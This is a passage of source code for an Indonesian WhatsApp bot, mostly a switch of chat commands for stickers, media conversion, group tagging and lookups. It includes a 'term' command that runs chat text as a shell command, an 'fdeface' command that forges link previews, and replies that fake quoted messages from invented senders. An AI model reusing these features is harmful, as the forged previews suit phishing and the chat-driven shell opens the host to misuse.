reply(mess.wait)
	 ahu = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
	masa = await xdev.downloadAndSaveMediaMessage(ahu)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${masa} -af atempo=1/2,asetrate=44500*2/1 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(masa)
if (err) return reply('Error!')
buffer453 = fs.readFileSync(ran)
xdev.sendMessage(from, buffer453, audio, { mimetype: "audio/mp4", ptt: true, quoted: dev})
fs.unlinkSync(ran)})
break

            
                      
                      
                      
                      
                      
                      
      
            
            
            
     

      
       
      
        case 'listrespon':{
          let txt = `List Respon\nTotal : ${commandsDB.length}\n\n`
          for (let i = 0; i < commandsDB.length; i++){
          txt += `❏ Key : ${commandsDB[i].pesan}\n`
          }
          reply(txt)
          }
        break
        
        
    case 'reverse':
            if (!isQuotedVideo) return reply('Reply videonya!')
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return reply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            xdev.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
    

       case 'sourcecode': 
       case 'sc': 
       case 'src':
              xdev.sendMessage(from, `Bot ini menggunakan sc dari youtube https://youtu.be/qxDSzDYDk44`, text, {quoted : dev, detecLinks : true})
              break

case 'style':
				  if(!q) return reply('Masukkan teks!')
         reply(mess.wait)
			axios.get(`https://kocakz.herokuapp.com/api/random/text/fancytext?text=${body.slice(7)}`).then((res) => {
      let hasil = `*Hasil* :\n${res.data.result}`;
      xdev.sendMessage(from, hasil, MessageType.text, { quoted: dev});
    })
break
case 'pastebin':
if(!q) return reply(`Contoh ${prefix}pastebin Extream`)
yamete = await fetchJson(`https://api-anoncybfakeplayer.herokuapp.com/pastebin?text=${q}`, {method: 'get'})
                   xdev.sendMessage(from, `${yamete.result}`, text, {quoted: ftext})
                     break
                     
                     
    case 'anime':
     if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'NIH'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
            
    case 'kontak':
    if(!q) return reply(`penggunaan ${prefix}kontak nomor| nama`)
            pe = args.join(' ') 
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            xdev.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
            break    
            
            case 'getname':
            if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return reply('Reply targetnya!')
            if(isGroup) {
        var ambl = dev.message.extendedTextMessage.contextInfo.participant
const sname = xdev.contacts[ambl] != undefined ? xdev.contacts[ambl].notify = undefined ? PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international') : xdev.contacts[ambl].notify || xdev.contacts[ambl].vname : PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international')
reply(sname)
}else {
const yahu = xdev.contacts[from] != undefined ? xdev.contacts[from].notify = undefined ? PhoneNumber('+' + from.replace('@s.whatsapp.net', '')).getNumber('international') : xdev.contacts[from].notify || xdev.contacts[from].vname : PhoneNumber('+' + from.replace('@s.whatsapp.net', '')).getNumber('international')
reply(yahu)
}
break
            
            
    case 'take':
    case 'colong':
    		if (!isQuotedSticker) return reply(`Reply stickernya denya ${prefix}take Wawan|suka makan`)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		    media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ahuh = args.join(' ').split('|')
            satu = ahuh[0] !== '' ? ahuh[0] : `EXTREAM`
            dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
            require('./lib/fetcher.js').createExif(satu, dua)
			require('./lib/fetcher.js').modStick(media, xdev, dev, from)
			break
			
	case 'stikerwm':
	case 'stickerwm':
    case 'swm':
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            if (isMedia && !dev.message.videoMessage || isQuotedImage ) {
            const encmedia = isQuotedImage   ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
             media = await xdev.downloadAndSaveMediaMessage(encmedia)
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            xdev.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: dev })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            xdev.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: dev })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out) 
            } else if ((isMedia && dev.message.videoMessage.seconds < 11 || isQuotedVideo && dev.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
            const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            const media = await xdev.downloadAndSaveMediaMessage(encmedia)
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            xdev.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: dev })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            xdev.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: dev })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out)       
            } else {
            reply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
            }
            break
    
    case 'fdeface':
            ge = args.join('')           
            var pe = ge.split("|")[0];
            var pen = ge.split("|")[1];
            var pn = ge.split("|")[2];
            var be = ge.split("|")[3];
            const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`
            if (args.length < 1) return reply (fde)
            const dipes = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            const tipes = await xdev.downloadAndSaveMediaMessage(dipes)        
            const bufer = fs.readFileSync(tipes)
            const desct = `${pn}`
            const title = `${pen}`
            const url = `${pe}`
            const buu = `https://${be}`
    		var anus = {
        	detectLinks: false
    		}
    		var mat = await xdev.generateLinkPreview(url)
    		mat.title = title;
    		mat.description = desct;
    		mat.jpegThumbnail = bufer;
   			mat.canonicalUrl = buu; 
    		xdev.sendMessage(from, mat, MessageType.extendedText, anus)
           fs.unlinkSync(tipes)
            break

		
			
				
			        
				
				     
				
				
				
				
				
				
				
				case 'delerror':
				case 'delror':
					if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
					try {
					 listerror.splice(q, 1)
					fs.writeFileSync('./database/listerror.json', JSON.stringify(listerror))
					await xdev.sendMessage(from, `Sukses menghapus ${q} di daftar error`, text)
					} catch (err){
						console.log(err)
						reply('eror kak')
					}
					break
				
				
				
				case 'addmusik':
				{
				
				if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedAudio) return reply('Reply musik')
				if (!q) return reply('Nama musiknya apa')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await xdev.downloadMediaMessage(boij)
				musiknye.push(q)
				fs.writeFileSync(`./temp/musik/${q}.mp3`, delb)
				fs.writeFileSync('./temp/music.json', JSON.stringify(musiknye))
				await xdev.sendMessage(from, `Sukses Menambahkan musik\nCek dengan cara ${prefix}musik`, MessageType.text, { quoted: dev})
				}
				break
				
				
				
				
				case 'delmusik':
					if (!isOwner) return 
					try {
				await reply(mess.wait)
					 wanu = audionye.indexOf(q)
					 musiknye.splice(wanu, 1)
					 fs.unlinkSync(`./temp/musik/${q}.mp3`)
					fs.writeFileSync('./temp/music.json', JSON.stringify(musiknye))
					await xdev.sendMessage(from, `Sukses menghapus musik ${q}`, text)
					} catch (err){
						console.log(err)
						reply('eror kak')
					}
					break
				
				
				
				
				
				case 'delvn':
					if (!isOwner) return 
					try {
					 wanu = audionye.indexOf(q)
					 audionye.splice(wanu, 1)
					fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
				    fs.unlinkSync(`./temp/audio/${q}.mp3`)
					xdev.sendMessage(from, 'Sukses', text)
					} catch (err){
						console.log(err)
						reply('eror kak')
					}
					break
					
					
					
				case 'restart':
if (!isOwner && !dev.key.fromMe) return reply("Khusus Owner")
await reply(`Succes restarting`)
exec(`node main`)
break
	
			
				
				case 'liststik':
				teks = '*Sticker list :*\n\n'
				for (let awokwkwk of setiker) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${setiker.length}*`
				xdev.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": setiker } })
				break
				
				case 'listimg':
				teks = '*Image list :*\n\n'
				for (let awokwkwk of imagenye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${imagenye.length}*`
				xdev.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": setiker } })
				break
				
				case 'listvid':
				  case 'listvideo':
				teks = '*List Video :*\n\n'
				for (let awokwkwk of videonye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${videonye.length}* `
				xdev.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": imagenye } })
				break
				
				case 'listvn':
			case 'vnlist':
				teks = '*List Vn:*\n\n'
				for (let awokwkwk of audionye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total ada : ${audionye.length}*`
				teks += `\n\n*Untuk mengambil vn silakan ketik nama vn*`
				xdev.sendMessage(from, teks.trim(), extendedText, { quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `Hmm`,'jpegThumbnail': thumb }}}, contextInfo: forward })
				break
				
				
				
				
				
				
				
		    case 'listmusik':
			case 'musiklist':
			case 'musik':
				teks = '*List Musik:*\n\n'
				for (let awokwkwk of musiknye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total ada : ${musiknye.length}*`
				teks += `\n\n*Untuk mengambil musik silakan ketik nama musik*`
				
				
    const rows2 = [{
        "title": 'Hello Mother F',
        "rowId": '0'
    }, {
        "title": 'ASADE',
        "rowId": '0'
    },{
        "title": 'Sugar Crash',
        "rowId": '0'
    }, {
        "title": 'Ring Ring You',
        "rowId": '0'
    },{
        "title": 'DJ CAMPURAN',
        "rowId": '0'
    },{
        "title": 'DJ OPUS',
        "rowId": '0'
    }];
    const sections2 = [{
        title: 'Pilih salah satu',
        rows: rows2
    }];
    const listt2 = {
        buttonText: 'SELECT HERE',
        title: `*Cek musik di sini*`,
        description: `Bisa di ketik atau di klik disini`,
        footerText: `Fitur ini masih uji coba`,
        sections: sections2,
        listType: 1
    };
    xdev.sendMessage(from, teks.trim(), extendedText, { quoted: ftext, contextInfo: forward })
    xdev.sendMessage(from, listt2, MessageType.listMessage, {
        contextInfo: {
            "mentionedJid": [sender]
        }
    })
break
				
				
 



	



	
			
	
                   
             
					
        
    
    
    
    

case 'sticker':
					case 'stiker':
					case 's':
					try{
						if (isMedia && !dev.message.videoMessage || isQuotedImage) {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
							const media = await xdev.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										reply(`Error : ${err}`)
										fs.unlinkSync(media)
										reply("Error Api")
									})
									.on('end', function () {
										console.log('Finish')
										xdev.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: dev})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./sticker/${sender}.webp`)	
										})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else if ((isMedia && dev.message.videoMessage.fileLength < 10000000 || isQuotedVideo && dev.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
							const media = await xdev.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							reply(mess.wait)
								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										xdev.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: dev})
											fs.unlinkSync(media)
											fs.unlinkSync(`./sticker/${sender}.webp`)
										})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else {
							reply(`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
						}
						} catch (err){
							console.log(err)
							reply("Yah gagal om")
							}
						break

            case 'addcmd': 
			case 'setcmd':{
                  if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
                  if (isQuotedSticker) {
                  if (!q) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
                  var kodenya = dev.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
                   if (checkSCommand(kodenya, _scommand) === true) return reply(`Command tersebut sudah ada`)
                  addCmd(kodenya, q)
                  reply("_Success_")
                  } else {
                  reply('tag stickenya')
                  }
                  }
            break
            
            
			
            case 'toptt':
             if (isQuotedAudio){
					reply(mess.wait)
					encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await xdev.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply('Gagal mengkonversi audio ke ptt')
						topt = fs.readFileSync(ran)
						 xdev.sendMessage(from, topt, audio, {mimetype: 'audio/mp4', quoted: dev, ptt:true})
						fs.unlinkSync(ran)
						})
						}
					break
            
   
            
            case 'delcmd':{
                  if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
                  if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
                  var kodenya = dev.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
                  if (checkSCommand(kodenya, _scommand) === false) return reply(`Command tersebut tidak ada`)
                  _scommand.splice(getCommandPosition(kodenya), 1)
                  fs.writeFileSync('./database/scommand.json', JSON.stringify(_scommand))
                  reply("_Success_")
                  }
            break
            case 'listcmd':
let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
let cemde = [];
for (let i of _scommand) {
cemde.push(i.id)
teksnyee += `\n\n*•> ID :* ${i.id}\n*•> Cmd* : ${i.chats}`
}
mentions(teksnyee, cemde, true)
break
    case 'toimg':
			if (!isQuotedSticker) return reply('Reply stickernya')
			reply(mess.wait)
			encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await xdev.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.png')
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return reply('Yah gagal, coba ulangi ^_^')
			buffer = fs.readFileSync(ran)
			fakethumb(buffer,'NIH')
			fs.unlinkSync(ran)
			})
			break
	
	
			
			
	
	
	case 'semoji':
			if (!q) return reply('emojinya?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[4].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break
    
    
	
            
 case 'gimage':
case 'googleimage':
case 'image':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 1) return reply('Apa Yang Mau Dicari?')
reply(mess.wait)
teks = args.join(' ')
res = await gis(teks, google)
function google(error, result){
if (error){ return reply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
sendFileFromUrl(random, image, {quoted: dev, caption: `*Hasil Pencarian Dari :* ${teks}`})
}
}
limitAdd(sender, limit)
break



case 'listonline':
             if (!isGroup) return reply(`*Only group*`)
             try {
             let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
             let online = [...Object.keys(xdev.chats.get(ido).presences), xdev.user.jid]
             xdev.sendMessage(from, '*List Online:*\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: dev, contextInfo: { mentionedJid: online }})
             } catch (e) {
             reply(`${e}`)
}
             break


case 'listgc':
case 'gclist':
case 'listgroup':
                case 'listgrup':
                case 'listgrop':
                case 'gruplist':
                case 'groplist':
                case 'grouplist':
  const txs = xdev.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`- ${xdev.getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`\n\n`
  reply(txs)
  break
            
            
            
           
           
           
            
            
 	
    
     
     
    case 'brainly':
    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
			if (args.length < 1) return reply('Pertanyaan apa')
          	brien = args.join(' ')
			brainly(`${brien}`).then(res => {
			teks = '❉───────────────────────❉\n'
			for (let Y of res.data) {
			teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
			}
			xdev.sendMessage(from, teks, text,{quoted:dev,detectLinks: true})                     
            })        
      limitAdd(sender, limit)
			break
			
			
    
            
            
    

  
	case 'term':
    if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
			if (!q) return reply(mess.wrongFormat)
			exec(q, (err, stdout) => {
			if (err) return reply(`SELF-BOT:~ ${err}`)
			if (stdout) {
			reply(stdout)
			}
			})
		    break 
		
		
    case 'join':    
    try{
                          if (!isOwner)return reply(`Perintah ini Khusus owner`) 
                          if (args.length < 1) return reply(`Kirim perintah *${prefix}join* link grup`)
                          if(!isGroup){
                          if (!isUrl(args[0]) && !args[0].includes('chat.whatsapp.com')) return reply(mess.error.Iv)
                          let code = args[0].replace('https://chat.whatsapp.com/', '')
                          xdev.acceptInvite(code)
                         
                          reply(`_Succses Join Group!_`)
                          } else {
                            if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return reply('*The link is invalid Tod*')
                            link = args[0].replace('https://chat.whatsapp.com/','')
                            fak = xdev.query({ json: ['action', 'invite', link],
                            expect200: true })
                           
                            reply('*Successfully Entered Group*')
                            }
                           }catch (err){
						console.log(err)
						return reply("Link Error")
					}
                           break
                 
                 
                case 'ovo':
                  xdev.sendMessage(from, fs.readFileSync('./kode qr/ovo.jpg'), image, {quoted: ftroli})
                    break 
                case 'gopay':
                  xdev.sendMessage(from, fs.readFileSync('./kode qr/gopay.jpg'), image, {quoted: ftroli})
                    break 
                     case 'dana':
                  xdev.sendMessage(from, fs.readFileSync('./kode qr/dana.jpg'), image, {quoted: ftroli})
                    break 
                 
    

            
    case 'runtime':
    case 'test':
    {
            run = process.uptime() 
            teks = `Active ${kyun(run)}`
            
            await xdev.sendMessage(from, teks, text, {quoted: fgc})
            }
            break  
      
      
	case 'speed':
	case 'ping':
			const timestamp = speed();
			exec(`neofetch --stdout`, (error, stdout, stderr) => {
			const child = stdout.toString('utf-8')
			const teks = child.replace(/Memory:/, "Ram:")
			const pingnya = `${teks}Speed: ${latensi.toFixed(4)} Second`
			xdev.sendMessage(from, pingnya, text, {quoted: ftext})
			})
			break  
			
			
    case 'totag':
    if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
            if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !dev.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4',
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !dev.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
    
    case 'tourl':
            if ((isMedia && !dev.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            owgi = await xdev.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            reply('kirim/reply gambar/video')
            }
            break	
    
    
    case 'inspect':
    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            try{
            reply(mess.wait)
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            if (!q) return reply('masukan link wa')
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return reply('pastikan itu link https://whatsapp.com/')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await xdev.query({ 
            json: ["query", "invite",net],
            expect200:true })
            let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
*Id desc* : ${descId}
${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
           for ( let y of participants) {
             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
             }
             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             xdev.sendMessage(from,par,text,{quoted:dev,contextInfo:{mentionedJid:jids}})
             limitAdd(sender, limit)
             } catch (err){
						console.log(err)
						reply(err)
					}
			
             break
             
            
					
										case 'sider':
										try{
										if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return reply('Reply targetnya!')
infom = await xdev.messageInfo(from, dev.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
shape = '▢'
teks = `Telah Dibaca Oleh :\n\n`
for(let i of infom.reads){
teks += shape+' ' + '@' + i.jid.split('@')[0] + '\n'
teks += `┗━ ${shape} Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
} catch (err){
						console.log(err)
						reply("Uh emror, pastikan yang di reply pesan dari botnya ya kak")
					}
break

					case 'banchat':
if (!isGroup) return reply(mess.only.group)

if (isBanchat) return reply(`udah di ban`)
bancht.push(from)
fs.writeFileSync('./database/banchat.json', JSON.stringify(bancht))
reply(`Bot berhasil Ban di group ini`)
break


					

case 'unbanchat':
				if (!isOwner) return 
					try {
if (!isBanchat) return reply(`udah di UnBan`)
let anu = bancht.indexOf(from)
bancht.splice(anu, 1)
fs.writeFileSync('./database/banchat.json', JSON.stringify(bancht))
reply(`Bot telah di Unban di group ini`)
} catch (err){
						console.log(err)
						sendSticker(emror)
					}
					break




case 'infoall': case 'tagall':
 if(isExtream) return
if(!q) return reply('Ingfonya apa?')
if (!isGroup) return reply(mess.only.group)
var nom = dev.participant
members_id = []
	teks = '\n'
	for (let mem of groupMembers) {
	teks += `┣ ⬣@${mem.jid.split('@')[0]}\n`
	members_id.push(mem.jid)
	}
mentions(`
*From :* ${pushname}

 Info :  ${q}

Total Member : ${groupMembers.length} 

┏━⬣`+teks+`┗━⬣`, members_id, false)
break












case 'playytmp3':
			if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
			let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
